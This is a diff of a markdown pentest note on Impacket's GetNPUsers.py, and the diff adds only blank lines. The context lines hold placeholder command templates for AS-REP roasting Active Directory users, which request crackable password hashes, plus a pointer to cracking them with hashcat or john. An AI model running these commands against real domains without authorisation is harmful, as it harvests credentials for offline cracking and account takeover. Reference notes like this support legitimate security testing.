@@ -9,12 +9,20 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # getnpusers.py
 
+
+
 **Command** ([[check ASREPRoast for all domain users (credentials required)]]):
 
 ```bash
 python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
 ```
+
+
+
+
+
+
 
 **Command** ([[check ASREPRoast for a list of users (no credentials required)]]):
 
@@ -23,6 +31,12 @@ python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_resp
 
 ```
 
+
+
+
+
+
+
 **Command** ([[check kerberoast]]):
 
 ```bash
@@ -30,6 +44,12 @@ python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format hash
 
 ```
 
+
+
+
+
 # crack as_rep_response_file
 
 search for hashcat / john
+
+
